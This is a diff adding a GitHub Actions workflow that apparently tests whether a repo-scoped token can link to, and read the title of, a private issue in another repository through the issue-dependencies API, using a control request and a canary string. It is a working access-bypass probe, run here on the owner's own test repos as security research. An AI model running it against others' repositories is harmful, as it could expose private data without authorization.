@@ -1,0 +1,62 @@
+name: apex-probe
+on:
+  workflow_dispatch:
+permissions:
+  issues: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: boundary probe with repo-scoped GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TARGET_ID: "4861817623"
+          OWNER: MrW0r57
+          A: apex-dep-a
+          B: apex-dep-b
+        run: |
+          set +e
+          mkdir -p /tmp/o
+          api() { local out="$1"; shift; curl -s -o "$out" -w "%{http_code}" \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" "$@"; }
+
+          curl -s -D /tmp/o/scope_hdr -o /dev/null -H "Authorization: Bearer $GH_TOKEN" \
+            https://api.github.com/repos/$OWNER/$A
+          SCOPES=$(grep -i '^x-oauth-scopes:' /tmp/o/scope_hdr | tr -d '\r' | sed 's/^[Xx]-[Oo]auth-[Ss]copes: *//')
+          [ -z "$SCOPES" ] && SCOPES="(installation token; no x-oauth-scopes header)"
+
+          # CONTROL: repo-A-scoped token reads repo-B directly -> expect 404 (proves isolation)
+          B_DIRECT=$(api /tmp/o/bdirect https://api.github.com/repos/$OWNER/$B/issues/1)
+
+          # WRITE boundary: create blocked_by edge A#1 -> PRIVATE repo-B issue id
+          W=$(api /tmp/o/wbody -X POST -d "{\"issue_id\":$TARGET_ID}" \
+            https://api.github.com/repos/$OWNER/$A/issues/1/dependencies/blocked_by)
+
+          # READ boundary: GET blocked_by -> does it leak repo-B private title to scoped token?
+          R=$(api /tmp/o/rbody https://api.github.com/repos/$OWNER/$A/issues/1/dependencies/blocked_by)
+
+          LEAK=false; grep -q CANARY_PRIV_9f3a1c /tmp/o/rbody && LEAK=true
+          TITLE=$(jq -r 'if type=="array" and length>0 then (.[0].title // "") else "" end' /tmp/o/rbody 2>/dev/null)
+          WERR=$(head -c 200 /tmp/o/wbody | tr '\n' ' ')
+
+          jq -n --arg scopes "$SCOPES" --arg bd "$B_DIRECT" --arg w "$W" \
+                --arg werr "$WERR" --arg r "$R" --argjson leak $LEAK --arg title "$TITLE" \
+            '{scopes:$scopes,
+              control_read_repoB_direct_status_expect404:$bd,
+              write_blocked_by_status:$w,
+              write_body_first200:$werr,
+              read_blocked_by_status:$r,
+              canary_leaked_to_scoped_token:$leak,
+              leaked_private_title:$title}' > /tmp/o/result.json
+          echo "=== APEX_RESULT ==="; cat /tmp/o/result.json
+
+          jq -n --rawfile r /tmp/o/result.json \
+            '{body: ("APEX-PROBE-RESULT\n\n```json\n" + $r + "\n```")}' > /tmp/o/comment.json
+          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -d @/tmp/o/comment.json \
+            https://api.github.com/repos/$OWNER/$A/issues/1/comments >/dev/null
+          echo "posted result comment"
